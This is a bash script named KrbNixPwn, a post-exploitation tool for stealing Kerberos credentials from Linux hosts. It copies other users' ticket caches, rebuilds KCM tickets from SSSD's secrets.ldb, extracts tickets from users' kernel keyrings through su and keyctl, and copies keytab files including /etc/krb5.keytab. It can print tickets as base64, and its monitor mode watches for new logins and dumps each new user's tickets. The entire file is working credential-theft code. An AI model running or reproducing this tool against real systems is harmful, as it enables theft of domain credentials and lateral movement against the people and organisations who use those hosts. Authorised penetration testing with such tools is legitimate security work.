#!/usr/bin/env bash
# KrbNixPwn - Kerberos ticket extraction tool for Linux
# version : 1.3
# Author : https://github.com/onSec-fr


# ---------------------- Default values ----------------------
OUTPUT_DIR="/tmp/krbnixpwn"
MODE=""
VERBOSE=0

# ---------------------- Utility Functions ----------------------

# Print a message with a given level (DEBUG, INFO, WARN, ERROR, SUCCESS)
print_msg() {
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local level="$1"
    local msg="$2"
    # suppress PRINTOUT messages unless PRINTOUT enabled
    if [[ "$level" == "PRINTOUT" && "${PRINTOUT:-0}" -ne 1 ]]; then
        return
    fi
    # suppress VERBOSE messages unless VERBOSE enabled
    if [[ "$level" == "DEBUG" && "${VERBOSE:-0}" -ne 1 ]]; then
        return
    fi
    case "$level" in
        DEBUG)   echo -e "[DEBUG] [$timestamp] $msg" ;;
        INFO)    echo -e "\e[34m[INFO] [$timestamp] $msg\e[0m" ;;
        WARN)    echo -e "\e[33m[WARN] [$timestamp] $msg\e[0m" ;;
        ERROR)   echo -e "\e[31m[ERROR] [$timestamp] $msg\e[0m" ;;
        SUCCESS) echo -e "\e[32m[SUCCESS] [$timestamp] $msg\e[0m" ;;
        PRINTOUT)    echo -e "\e[35m[PRINTOUT] [$timestamp] $msg\e[0m" ;;
        *)       echo "$msg" ;;
    esac
}

# Convert a hex string to binary output
hex_to_bin() {
    local hex="$1"
    local i
    for ((i=0; i<${#hex}; i+=2)); do
        printf "\\x${hex:i:2}"
    done
}

# Sanitize a string for safe filenames (keep a small safe charset)
sanitize_name() {
    local s="$1"
    # replace problematic chars with underscore and keep only a safe charset
    printf "%s" "$s" | tr '/:@ ' '___' | tr -cd 'A-Za-z0-9._-'
}

# Show a file's content as base64
show_base64() {
    local file="$1"
    if [ -z "$file" ]; then
        print_msg DEBUG "show_base64: no file specified"
        return 1
    fi
    if [ ! -f "$file" ]; then
        print_msg DEBUG "show_base64: file not found: $file"
        return 2
    fi
    local b64=""
    if command -v base64 >/dev/null 2>&1; then
        # try GNU base64 -w0, fall back to plain base64
        b64=$(base64 -w0 "$file" 2>/dev/null || base64 "$file" 2>/dev/null | tr -d '\n' || true)
    elif command -v openssl >/dev/null 2>&1; then
        b64=$(openssl base64 -in "$file" 2>/dev/null | tr -d '\n' || true)
    elif command -v python3 >/dev/null 2>&1; then
        b64=$(python3 -c 'import sys,base64; print(base64.b64encode(open(sys.argv[1],"rb").read()).decode())' "$file" 2>/dev/null || true)
    else
        print_msg DEBUG "show_base64: no base64 encoder available"
        return 3
    fi
    if [ -n "$b64" ]; then
        print_msg PRINTOUT "Displaying content of ticket $file : $b64"
    else
        print_msg DEBUG "show_base64: base64 output empty for $file"
    fi
}

# Return next available outfile path for a base and extension
next_outfile() {
    local base="$1"; local ext="$2"; local out; local idx=1
    while true; do
        out="${OUTPUT_DIR}/${base}_$(printf "%02d" "$idx")${ext}"
        if [ ! -f "$out" ]; then
            printf "%s" "$out"
            return 0
        fi
        idx=$((idx+1))
    done
}

# Print usage/help
print_usage() {
    echo "KrbNixPwn - Kerberos ticket extraction tool"
    echo "Usage: $0 [dump|monitor] [-o output_dir] [-verbose] [-h|--help]"
}

# Argument parsing
while [[ $# -gt 0 ]]; do
    case "$1" in
        -o|--output)
            OUTPUT_DIR="$2"
            shift 2
        ;;
        -h|--help)
            print_usage
            exit 0
        ;;
        -v|--verbose)
            VERBOSE=1
            shift 1
        ;;
        -p|--printout)
            PRINTOUT=1
            shift 1
        ;;
        dump)
            MODE="dump"
            shift 1
        ;;
        monitor)
            MODE="monitor"
            shift 1
        ;;
        *)
            echo -e "\e[31m[ERROR] Unknown argument: $1\e[0m"
            exit 1
        ;;
    esac
done

if [[ -z "$MODE" ]]; then
    echo -e "\e[31m[ERROR] You must specify a mode: dump or monitor\e[0m"
    echo "Usage: $0 [dump|monitor] [-o output_dir] [-verbose]"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Detect the Kerberos realm configured on the system
detect_kerberos_realm() {
    # Extract the default realm from krb5.conf
    realm=$(awk -F '=' '/^[[:space:]]*default_realm/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/krb5.conf)
    if [ -n "$realm" ]; then
        print_msg INFO "Kerberos realm detected: $realm"
    else
        print_msg WARN "No Kerberos realm found in /etc/krb5.conf."
    fi
}


# Detect the Kerberos cache type and location for a given user
detect_cache_method() {
    local user="$1"
    local uid
    uid=$(id -u "$user")
    # Try to list tickets with klist as the target user
    local line
    line=$(sudo -i -u "$user" klist 2>/dev/null | grep 'Ticket cache:')
    if [ -n "$line" ]; then
        echo "$line" | awk '{print $3}'
        return
    fi
    # If no output, look in krb5 config
    if [ -f /etc/krb5.conf ]; then
        cconf=$(awk -F'=' '/^[[:space:]]*default_ccache_name[[:space:]]*=/{ if ($0 !~ /^[[:space:]]*#/) { val=$2; for(i=3;i<=NF;i++) val=val "=" $i; gsub(/^[[:space:]]+|[[:space:]]+$/,"",val); print val; exit } }' /etc/krb5.conf 2>/dev/null || true)
        if [ -n "$cconf" ]; then
            # strip surrounding quotes and trim
            cconf=${cconf#\"}
            cconf=${cconf%\"}
            cconf=$(printf "%s" "$cconf" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            # expand %U and %u to uid
            cpath=${cconf//%U/$uid}
            cpath=${cpath//%u/$uid}
            # handle DIR: and FILE:
            if [[ "$cpath" =~ ^DIR:(.*) ]]; then
                p="${BASH_REMATCH[1]}"
                if [ -d "$p" ]; then
                    echo "DIR:$p"
                    return
                fi
            elif [[ "$cpath" =~ ^FILE:(.*) ]]; then
                p="${BASH_REMATCH[1]}"
                if [ -f "$p" ]; then
                    echo "FILE:$p"
                    return
                fi
            fi
        fi
    fi
    # If no output, search for ccache files in known locations
    for d in /tmp/krb5cc_"$uid"*; do
        [ -e "$d" ] || continue
        if [ -d "$d" ]; then
            echo "DIR:$d"
            return
            elif [ -f "$d" ]; then
            echo "FILE:$d"
            return
        fi
    done
    # If no cache found, return unknown
    echo "UNKNOWN"
}


# Dump Kerberos ticket using FILE cache mode
# Copies the user's ccache file and writes it to the output directory
dump_file() {
    local user="$1"
    local path="$2"
    
    # Create a temporary copy of the ccache file
    local tmpfile
    safe_user=$(sanitize_name "${user:-unknown}")
    tmpfile=$(mktemp "${OUTPUT_DIR}/tmp_${safe_user}_XXXXXX.ccache")
    if ! cp -- "$path" "$tmpfile" 2>/dev/null; then
        print_msg ERROR "Failed to copy $path to temp file"
        rm -f "$tmpfile" || true
        return 2
    fi
    
    # Extract the Kerberos realm from the ccache file
    local realm
    realm=$(klist -c "FILE:$tmpfile" 2>/dev/null | awk '/Default principal:/ {print $3}' | awk -F'@' '{print toupper($2)}')
    
    if [ -z "$realm" ]; then
        print_msg WARN "Could not extract realm for $user from $tmpfile"
        rm -f "$tmpfile"
        return
    fi
    
    # Generate output ccache file name
    local user_short="${user%@*}"
    local base="${user_short}_${realm}"
    local idx=1
    local outfile
    
    while true; do
        outfile="${OUTPUT_DIR}/${base}_$(printf "%02d" "$idx").ccache"
        if [ ! -f "$outfile" ]; then
            break
        fi
        idx=$((idx+1))
    done
    
    if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
        print_msg SUCCESS "Dumped $user ccache -> $outfile"
        show_base64 "$outfile"
    else
        print_msg ERROR "Failed to move $tmpfile -> $outfile"
        rm -f "$tmpfile" || true
        return 3
    fi
}


# Dump Kerberos ticket using DIR cache mode
# Reads the primary ticket from a directory cache and writes it to the output directory
dump_dir() {
    local user="$1"
    local path="$2"
    
    # Check for the 'primary' file in the cache directory
    local primary_file="${path}/primary"
    if [ ! -f "$primary_file" ]; then
        print_msg WARN "No primary file in $path"
        return
    fi
    
    # Read the name of the primary ticket file
    local ticket_file
    ticket_file=$(cat "$primary_file")
    local ticket_path="${path}/${ticket_file}"
    
    if [ ! -f "$ticket_path" ]; then
        print_msg WARN "Primary ticket $ticket_file not found in $path"
        return
    fi
    
    # Create a temporary copy of the ticket file
    local tmpfile
    safe_user=$(sanitize_name "${user:-unknown}")
    tmpfile=$(mktemp "${OUTPUT_DIR}/tmp_${safe_user}_XXXXXX.ccache")
    if ! cp -- "$ticket_path" "$tmpfile" 2>/dev/null; then
        print_msg ERROR "Failed to copy $ticket_path to temp file"
        rm -f "$tmpfile" || true
        return 2
    fi
    
    # Extract the Kerberos realm from the ticket file
    local realm
    realm=$(klist -c "FILE:$tmpfile" 2>/dev/null | awk '/Default principal:/ {print $3}' | awk -F'@' '{print toupper($2)}')
    
    if [ -z "$realm" ]; then
        print_msg WARN "Could not extract realm for $user from $tmpfile"
        rm -f "$tmpfile"
        return
    fi
    
    # Generate output ccache file name
    local user_short="${user%@*}"
    local base="${user_short}_${realm}"
    local idx=1
    local outfile
    
    while true; do
        outfile="${OUTPUT_DIR}/${base}_$(printf "%02d" "$idx").ccache"
        if [ ! -f "$outfile" ]; then
            break
        fi
        idx=$((idx+1))
    done
    
    if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
        print_msg SUCCESS "Dumped $user ccache -> $outfile"
        show_base64 "$outfile"
    else
        print_msg ERROR "Failed to move $tmpfile -> $outfile"
        rm -f "$tmpfile" || true
        return 3
    fi
}


# Dump Kerberos ticket using KCM cache mode
# Attempts to extract KCM secrets from SSSD secrets.ldb using bash and coreutils
dump_kcm() {
    local user="$1"
    LDB_FILE_SRC="/var/lib/sss/secrets/secrets.ldb"
    LDB_FILE="$OUTPUT_DIR/secrets.ldb.copy"
    # If SSSD uses an mkey file, the secrets LDB is encrypted and not supported at the moment
    if [ -f "/var/lib/sss/secrets/.secrets.mkey" ]; then
        print_msg WARN "Encrypted KCM databases detected (file /var/lib/sss/secrets/.secrets.mkey present). Encrypted KCM databases are not currently supported. You can use: https://github.com/mandiant/SSSDKCMExtractor to decrypt it manually."
        return 4
    fi
    if [ ! -f "$LDB_FILE_SRC" ]; then
        print_msg INFO "LDB source file not found: $LDB_FILE_SRC"
        return 3
    fi
    if ! cp "$LDB_FILE_SRC" "$LDB_FILE" 2>/dev/null; then
        print_msg ERROR "Failed to copy LDB file from $LDB_FILE_SRC to $LDB_FILE"
        return 2
    fi
    
    # Portable hex utilities for parsing binary files
    read_hex_at() {
        local file="$1"; local off="$2"; local len="$3"
        if command -v hexdump >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$len" 2>/dev/null | hexdump -v -e '/1 "%02x"'
            elif command -v od >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$len" 2>/dev/null | od -An -v -t x1 | tr -s ' ' | sed 's/^ *//; s/ $//' | tr -d ' \n'
            elif command -v perl >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$len" 2>/dev/null | perl -lpe '$_=unpack("H*",$_)'
        else
            print_msg ERROR "ERR_NO_HEXDUMP_TOOL"
            return 1
        fi
    }
    
    pretty_hexdump() {
        local file="$1"; local off="$2"; local count="${3:-256}"
        if command -v hexdump >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$count" 2>/dev/null | hexdump -v -e '"%07.7_ax: "' -e '16/1 "%02x "' -e '"|"' -e '16/1 "%_p"' -e '"\n"'
            elif command -v od >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$count" 2>/dev/null | od -An -v -t x1 -w16 | sed -E 's/^ +//'
            elif command -v perl >/dev/null 2>&1; then
            dd if="$file" bs=1 skip="$off" count="$count" 2>/dev/null | perl -e 'use strict; use warnings; my $off=0; my $buf; while(read STDIN,$buf,16){ printf "%07x: ", $off; print join(" ", map { sprintf "%02x", ord($_) } split("", $buf)); printf " |"; my $a=$buf; $a=~s/[^\x20-\x7e]/./g; print $a; print "\n"; $off+=16 }'
        else
            print_msg ERROR "No suitable hex dump tool found"
            return 1
        fi
    }
    
    # Read a 32-bit little-endian integer from a file at a given offset
    read_le32() {
        local file="$1"; local off="$2"
        local hex
        hex=$(read_hex_at "$file" "$off" 4) || return 1
        local b1=${hex:0:2}; local b2=${hex:2:2}; local b3=${hex:4:2}; local b4=${hex:6:2}
        local be="${b4}${b3}${b2}${b1}"
        printf "%u" "$((0x$be))"
    }
    
    # Read a single byte from a file at a given offset
    read_u8() {
        local file="$1"; local off="$2"
        local h
        h=$(read_hex_at "$file" "$off" 1) || return 1
        printf "%u" "$((0x$h))"
    }
    
    # Read bytes from a file at a given offset and write to output file
    read_bytes_to_file() {
        local f="$1"; local off="$2"; local len="$3"; local out="$4"
        dd if="$f" bs=1 skip="$off" count="$len" of="$out" 2>/dev/null
    }
    
    # Write a hex string as binary to a file
    hexstr_to_file() {
        local hex="$1"
        local out="$2"
        if command -v perl >/dev/null 2>&1; then
            perl -e 'print pack("H*", shift)' "$hex" >> "$out"
        else
            hex_to_bin "$hex" >> "$out"
        fi
    }
    
    # Write a 32-bit big-endian integer to a file
    write_be32_to_file() {
        local v="$1"; local out="$2"
        local hex
        hex=$(printf "%08x" "$v")
        hexstr_to_file "$hex" "$out"
    }
    
    # Start parsing the secrets.ldb file
    print_msg DEBUG "Parsing LDB database : $LDB_FILE"
    if [ ! -f "$LDB_FILE" ]; then
        print_msg ERROR "LDB file not found: $LDB_FILE"
        return 3
    fi
    
    # Find all offsets of 'secret' tokens in the file
    mapfile -t secret_offsets < <(grep -aob --only-matching 'secret' "$LDB_FILE" | awk -F: '{print $1}') || true
    
    if [ "${#secret_offsets[@]}" -eq 0 ]; then
        print_msg WARN "No 'secret' tokens found in $LDB_FILE"
        return 4
    fi
    
    print_msg DEBUG "Found ${#secret_offsets[@]} 'secret' tokens. Trying to parse candidate KCM blobs..."
    
    count=0
    for off in "${secret_offsets[@]}"; do
        base_probe=$((off + 7))
        for probe_add in 0 4 8 12 16 24 32 48 64 96 128; do
            probe=$((base_probe + probe_add))
            # Read kdc_offset (4 le)
            if ! kdc_off=$(read_le32 "$LDB_FILE" "$probe" 2>/dev/null); then
                continue
            fi
            cur=$((probe + 4))
            # Read principal_presence (1 byte)
            if ! pp=$(read_u8 "$LDB_FILE" "$cur" 2>/dev/null); then
                continue
            fi
            cur=$((cur + 1))
            
            # Read realm length and realm string
            if ! realm_len=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then
                continue
            fi
            cur=$((cur + 4))
            if [ "$realm_len" -lt 1 ] || [ "$realm_len" -gt 256 ]; then
                continue
            fi
            
            realm=$(dd if="$LDB_FILE" bs=1 skip="$cur" count="$realm_len" 2>/dev/null | tr -d '\0' | tr -d '\r\n')
            cur=$((cur + realm_len))
            # Sanity check for realm string
            if [[ ! "$realm" =~ ^[A-Z0-9._@-]{1,64}$ ]]; then
                if dd if="$LDB_FILE" bs=1 skip=$((cur - realm_len)) count="$realm_len" 2>/dev/null | od -An -t x1 | grep -q '[^[:xdigit:] ]'; then
                    continue
                fi
            fi
            
            # Read cache type and principal count
            if ! ctype=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then continue; fi
            cur=$((cur + 4))
            if ! principals_len=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then continue; fi
            cur=$((cur + 4))
            if [ "$principals_len" -lt 1 ] || [ "$principals_len" -gt 16 ]; then
                continue
            fi
            
            principals=(); ok=true
            for ((i=0;i<principals_len;i++)); do
                if ! plen=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then ok=false; break; fi
                cur=$((cur + 4))
                if [ "$plen" -lt 0 ] || [ "$plen" -gt 1024 ]; then ok=false; break; fi
                pstr=$(dd if="$LDB_FILE" bs=1 skip="$cur" count="$plen" 2>/dev/null | tr -d '\0' | tr -d '\r\n')
                cur=$((cur + plen))
                principals+=("$pstr")
            done
            $([ "$ok" = true ]) || continue
            
            # Read credentials count
            if ! creds_len=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then continue; fi
            cur=$((cur + 4))
            if [ "$creds_len" -lt 1 ] || [ "$creds_len" -gt 1024 ]; then
                :
            fi
            
            creds_files=(); valid=true
            for ((ci=0; ci<creds_len; ci++)); do
                # Read UUID and credential blob
                if ! uuid_hex=$(read_hex_at "$LDB_FILE" "$cur" 16 2>/dev/null); then valid=false; break; fi
                cur=$((cur + 16))
                if ! blob_len=$(read_le32 "$LDB_FILE" "$cur" 2>/dev/null); then valid=false; break; fi
                cur=$((cur + 4))
                if [ "$blob_len" -le 0 ] || [ "$blob_len" -gt 200000 ]; then valid=false; break; fi
                tmpb=$(mktemp)
                read_bytes_to_file "$LDB_FILE" "$cur" "$blob_len" "$tmpb"
                cur=$((cur + blob_len))
                creds_files+=("$tmpb")
            done
            $([ "$valid" = true ]) || { for f in "${creds_files[@]:-}"; do rm -f "$f"; done; continue; }
            
            # Construct ccache-like file for the first matching principal
            safe_pr=$(sanitize_name "${principals[0]:-unknown}")

            print_msg DEBUG "Candidate at probe=$probe: realm='$realm' principal='${principals[0]:-}' creds=${#creds_files[@]}"
            local user_short="${user%@*}"
            if [ "$creds_len" -gt 0 ] && [ "${#user_short}" -gt 0 ] && [[ "${principals[0],,}" == "${user_short,,}"* ]]; then
                print_msg INFO "Matching candidate found for user='$user'"
            elif [ "$creds_len" -gt 0 ] && [ -z "${user:-}" ]; then
                # If $user parameter is empty, derive a user_short from the found principal
                user_short=$(printf "%s" "${principals[0]:-}" | awk -F'@' '{print $1}')
                print_msg INFO "Found cache in KCM for user $user_short"
            else
                for bf in "${creds_files[@]}"; do rm -f "$bf" || true; done
                continue
            fi
            
            # Create temporary ccache file
            safe_user=$(sanitize_name "${user_short:-unknown}")
            tmpfile=$(mktemp "${OUTPUT_DIR}/tmp_${safe_user}_XXXXXX.ccache")
            
            # Write minimal CCACHE header
            hex="0504000c00010008ffffffff00000000"
            if command -v perl >/dev/null 2>&1; then
                perl -e 'print pack("H*", shift)' "$hex" > "$tmpfile"
            else
                hex_to_bin "$hex" > "$tmpfile"
            fi
            write_be32_to_file "$ctype" "$tmpfile"
            write_be32_to_file "${#principals[@]}" "$tmpfile"
            write_be32_to_file "${#realm}" "$tmpfile"
            printf "%s" "$realm" >> "$tmpfile"
            for p in "${principals[@]}"; do
                write_be32_to_file "${#p}" "$tmpfile"
                printf "%s" "$p" >> "$tmpfile"
            done
            for bf in "${creds_files[@]}"; do
                cat "$bf" >> "$tmpfile"
                rm -f "$bf"
            done
            
            # Extract realm (and ticket expiry) from the generated ccache file
            klist_out=$(klist -c "FILE:$tmpfile" 2>/dev/null || true)
            realm=$(printf "%s" "$klist_out" | awk '/Default principal:/ {print $3}' | awk -F'@' '{print toupper($2)}')

            # Parse the first ticket line after the header 'Valid starting' to get expiry
            expires_line=$(printf "%s
" "$klist_out" | awk '/Valid starting/ {found=1; next} found && NF {print; exit}')
            if [ -n "$expires_line" ]; then
                # typical ticket line: <date1> <time1> <date2> <time2> <service-principal>
                expires_field=$(printf "%s" "$expires_line" | awk '{print $3" "$4}')
                print_msg DEBUG "Ticket Expires: $expires_field"
                expires_epoch=$(date -d "$expires_field" +%s 2>/dev/null || true)
                if [ -n "$expires_epoch" ]; then
                    now_epoch=$(date +%s)
                    if [ "$expires_epoch" -le "$now_epoch" ]; then
                        print_msg INFO "Ticket for ${user_short:-unknown} is expired (Expires: $expires_field). SKIPPING."
                        continue
                    fi
                else
                    print_msg WARN "Could not parse expiry date: $expires_field"
                fi
            fi

            if [ -z "$realm" ]; then
                print_msg WARN "Could not extract realm for $user from $tmpfile"
                rm -f "$tmpfile" || true
                return 1
            fi
            
            # Generate output ccache file name
            local base="$(sanitize_name "${user_short}")_$(sanitize_name "${realm}")"
            outfile=$(next_outfile "$base" ".ccache")
            if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
                print_msg SUCCESS "Dumped $user ccache -> $outfile"
                show_base64 "$outfile"
            else
                print_msg ERROR "Failed to move $tmpfile -> $outfile"
                rm -f "$tmpfile" || true
                for bf in "${creds_files[@]}"; do rm -f "$bf" || true; done
                return 3
            fi
        done
    done
    rm -f "$LDB_FILE" || true
    return 0
}

# Dump Kerberos ticket using KEYRING cache mode
# Extracts principal and ticket blobs from the user's persistent keyring and writes a ccache file
dump_keyring() {
    local user="$1"
    local uid
    uid=$(id -u "$user")
    
    local TMPDIR
    TMPDIR="$(mktemp -d)"
    trap 'rm -rf "$TMPDIR"' EXIT
    
    print_msg DEBUG "[KEYRING] Extracting keyring for user='$user' (uid=$uid)"
    
    # Get persistent keyring ID for the user
    PERSIST_ID=$(su - "$user" -c 'keyctl get_persistent @u' 2>/dev/null)
    if [[ -z "$PERSIST_ID" ]]; then
        print_msg WARN "Unable to get persistent keyring for $user"
        return 2
    fi
    print_msg DEBUG "Persistent keyring id: $PERSIST_ID"
    
    # List keys in the persistent keyring
    KEYSHOW=$(su - "$user" -c "keyctl show $PERSIST_ID" 2>/dev/null)
    if [[ -z "$KEYSHOW" ]]; then
        print_msg ERROR "keyctl show failed for $user"
        return 3
    fi
    print_msg DEBUG "Keyring listing:\n$KEYSHOW"
    
    # Find principal and ticket key IDs by name
    PRINC_ID=$(printf "%s\n" "$KEYSHOW" | awk 'tolower($0) ~ /__krb5_princ__/ { for(i=1;i<=NF;i++) if ($i ~ /^[0-9]+$/) { print $i; exit } }')
    KEY_ID=$(printf "%s\n" "$KEYSHOW" | awk 'tolower($0) ~ /krbtgt/ { for(i=1;i<=NF;i++) if ($i ~ /^[0-9]+$/) { print $i; exit } }')
    if [[ -z "$KEY_ID" ]]; then
        KEY_ID=$(printf "%s\n" "$KEYSHOW" | awk 'tolower($0) ~ /big_key/ { for(i=1;i<=NF;i++) if ($i ~ /^[0-9]+$/) { print $i; exit } }')
    fi
    
    if [[ -z "$PRINC_ID" ]]; then
        print_msg WARN "Unable to locate __krb5_princ__ in keyring for $user."
        return 4
    fi
    if [[ -z "$KEY_ID" ]]; then
        print_msg WARN "Unable to locate big_key (krbtgt) in keyring for $user."
        return 5
    fi
    
    print_msg DEBUG "Found PRINC_ID=$PRINC_ID KEY_ID=$KEY_ID"
    
    # Extract hex blobs for principal and ticket
    PRINC_HEX="$(su - "$user" -c "keyctl print $PRINC_ID" 2>/dev/null | sed -n 's/.*://p' | tr -d ' \n')"
    KEY_HEX="$(su - "$user" -c "keyctl print $KEY_ID"   2>/dev/null | sed -n 's/.*://p' | tr -d ' \n')"
    
    if [[ -z "${PRINC_HEX:-}" || -z "${KEY_HEX:-}" ]]; then
        print_msg ERROR "Unknown extraction error for $user."
        print_msg DEBUG "PRINC (raw):"
        su - "$user" -c "keyctl print $PRINC_ID" || true
        print_msg DEBUG "KEY (raw):"
        su - "$user" -c "keyctl print $KEY_ID" || true
        return 6
    fi
    
    # Build ccache file header and content
    HEADER='0504000c00010008ffffffff00000000'
    HEX="${HEADER}${PRINC_HEX}${KEY_HEX}"
    
    # Generate output filename
    local realm
    realm=$(su - "$user" -c "klist" 2>/dev/null | awk '/Default principal:/ {print $3}' | awk -F'@' '{print toupper($2)}')
    local user_short="${user%@*}"
    local base="${user_short}_${realm:-KEYRING}"
    local idx=1
    local outfile
    while true; do
        outfile="${OUTPUT_DIR}/${base}_$(printf "%02d" "$idx").ccache"
        if [ ! -f "$outfile" ]; then
            break
        fi
        idx=$((idx+1))
    done
    
    # Write binary ccache file
    hex_to_bin "$HEX" > "$outfile"
    print_msg SUCCESS "Dumped $user ccache -> $outfile"
    show_base64 "$outfile"
    
    return 0
}

# Handle the main extraction routine
dump_user() {
    local user="$1"
    local cache
    cache=$(detect_cache_method "$user")
    # Extract output type and path
    local prefix path
    prefix="${cache%%:*}"
    path="${cache#*:}"
    case "$prefix" in
        FILE)
            print_msg INFO "User $user cache found: FILE:$path"
            dump_file "$user" "$path"
        ;;
        DIR)
            print_msg INFO "User $user cache found: DIR:$path"
            dump_dir "$user" "$path"
        ;;
        KCM)
            print_msg INFO "User $user cache found: KCM:$path"
            dump_kcm "$user"
        ;;
        KEYRING)
            print_msg INFO "User $user cache found: KEYRING -> $path"
            dump_keyring "$user"
        ;;
        UNKNOWN)
            print_msg WARN "No Kerberos cache detected for user $user"
        ;;
        *)
            print_msg WARN "No Kerberos cache detected for user $user"
        ;;
    esac
}

# Search and dump any valid cache files on the system
dump_all() {
    print_msg INFO "Scanning for ccache files..."

    # gather unique candidates
    declare -a candidates

    # find ccache files
    while IFS= read -r -d $'\0' f; do
        candidates+=("$f")
    done < <(
        find /home /tmp \
            -type f \( -name "*.ccache" -o -name "*krb5cc*" \) \
            -print0 2>/dev/null || true
    )

    # find files in directories containing 'krb5cc'
    while IFS= read -r -d $'\0' f; do
        dir=$(dirname "$f")
        if echo "$dir" | grep -qi "krb5cc"; then
            case "$f" in
                *.ccache) ;;
                *) candidates+=("$f") ;;
            esac
        fi
    done < <(find /home /tmp -type f -print0 2>/dev/null || true)

    # deduplicate candidates
    if [ ${#candidates[@]} -eq 0 ]; then
        print_msg INFO "No ccache files found"
    fi

    # use associative map to dedupe if supported
    if declare -A >/dev/null 2>&1; then
        declare -A seen
        uniq=()
        for f in "${candidates[@]}"; do
            if [ -z "${seen[$f]}" ]; then
                uniq+=("$f")
                seen[$f]=1
            fi
        done
        candidates=("${uniq[@]}")
    fi

    for f in "${candidates[@]}"; do
        [ -f "$f" ] || continue
        # validate with klist
        kout=$(klist -c "FILE:$f" 2>/dev/null || true)
        if [ -z "$kout" ]; then
            print_msg DEBUG "klist can't parse $f, skipping"
            continue
        fi
        principal=$(printf "%s" "$kout" | awk '/Default principal:/ {print $3}')
        if [ -z "$principal" ]; then
            print_msg DEBUG "No Default principal found in $f, skipping"
            continue
        fi
        realm=$(printf "%s" "$principal" | awk -F'@' '{print toupper($2)}')
        user_short=$(printf "%s" "$principal" | awk -F'@' '{print $1}')

        # sanitize pieces
        user_short_s=$(sanitize_name "$user_short")
        realm_s=$(sanitize_name "$realm")

        # Generate output filename
        base="${user_short_s}_${realm_s}"
        outfile=$(next_outfile "$base" ".ccache")

        if cp -- "$f" "$outfile" 2>/dev/null; then
            # Validate ticket validity range via klist
            klist_out=$(klist -c "FILE:$outfile" 2>/dev/null || true)
            if [ -z "$klist_out" ]; then
                print_msg WARN "klist can't parse $outfile; keeping file"
            else
                ticket_line=$(printf "%s\n" "$klist_out" | awk '/Valid starting/ {found=1; next} found && NF {print; exit}')
                if [ -n "$ticket_line" ]; then
                    start_field=$(printf "%s" "$ticket_line" | awk '{print $1" "$2}')
                    expires_field=$(printf "%s" "$ticket_line" | awk '{print $3" "$4}')
                    print_msg DEBUG "Ticket validity for $outfile: $start_field -> $expires_field"
                    start_epoch=$(date -d "$start_field" +%s 2>/dev/null || true)
                    expires_epoch=$(date -d "$expires_field" +%s 2>/dev/null || true)
                    now_epoch=$(date +%s)
                    if [ -n "$start_epoch" ] && [ -n "$expires_epoch" ]; then
                        if [ "$now_epoch" -lt "$start_epoch" ] || [ "$now_epoch" -gt "$expires_epoch" ]; then
                            print_msg DEBUG "Ticket in $outfile is not currently valid (Valid: $start_field -> $expires_field); removing file"
                            rm -f "$outfile" || true
                            continue
                        fi
                    else
                        print_msg DEBUG "Could not parse ticket validity for $outfile; keeping file"
                    fi
                else
                    print_msg DEBUG "No ticket line found in $outfile; keeping file"
                fi
            fi

            print_msg SUCCESS "Dumped $f -> $outfile"
            show_base64 "$outfile"
        else
            print_msg ERROR "Failed to copy $f -> $outfile"
        fi
    done

    # search for .keytab files and copy them without validation
    print_msg INFO "Searching for keytab files..."
    declare -a keytabs
    while IFS= read -r -d $'\0' k; do
        keytabs+=("$k")
    done < <(find /home /tmp -type f -name "*.keytab" -print0 2>/dev/null || true)

    if [ -f "/etc/krb5.keytab" ]; then
        keytabs+=("/etc/krb5.keytab")
    fi

    if [ ${#keytabs[@]} -gt 0 ]; then
        kt_idx=1
        for kf in "${keytabs[@]}"; do
            [ -f "$kf" ] || continue
            # find next available keytab filename
            kt_out=$(next_outfile "keytab" ".keytab")
            if cp -- "$kf" "$kt_out" 2>/dev/null; then
                print_msg SUCCESS "Copied keytab $kf -> $kt_out"
            else
                print_msg ERROR "Failed to copy keytab $kf -> $kt_out"
            fi
        done
    else
        print_msg INFO "No keytab files found"
    fi

    # dump cache from KCM database
    print_msg INFO "Extracting KCM caches from secrets.ldb..."
    dump_kcm ""

    # dump cache from keyring - logged on users only
    print_msg INFO "Extracting from keyring..."
    ps -eo uid= | sort -u | while read -r uid; do
        user=$(getent passwd "$uid" | cut -d: -f1)
        [ -z "$user" ] && continue
        if ! grep -q "^${user}:" /etc/passwd; then
            print_msg INFO "Found $user connected"
            dump_keyring "$user"
        fi
    done
}

# ---------------------- Main Entry Point ----------------------
detect_kerberos_realm

# Handle modes: dump, monitor
if [[ "$MODE" == "dump" ]]; then
    print_msg INFO "Searching for any kerberos material on the system"
    dump_all
    print_msg INFO "Dump complete"
    elif [[ "$MODE" == "monitor" ]]; then
    # List logged on users
    print_msg INFO "Searching for active sessions..."
    ps -eo uid= | sort -u | while read -r uid; do
        user=$(getent passwd "$uid" | cut -d: -f1)
        [ -z "$user" ] && continue
        if ! grep -q "^${user}:" /etc/passwd; then
            print_msg INFO "User $user connected"
            dump_user "$user"
        fi
    done
    # Monitor new logons
    print_msg INFO "Waiting for new sessions..."
    journalctl -f --since now _COMM=systemd-logind -q | while read -r line; do
        if [[ "$line" =~ New\ session\ [0-9]+\ of\ user\ ([^[:space:]]+)\. ]]; then
            user="${BASH_REMATCH[1]}"
            if ! grep -q "^${user}:" /etc/passwd; then
                print_msg INFO "New session from $user"
                dump_user "$user"
                print_msg INFO "Waiting for new sessions..."
            fi
        fi
    done
fi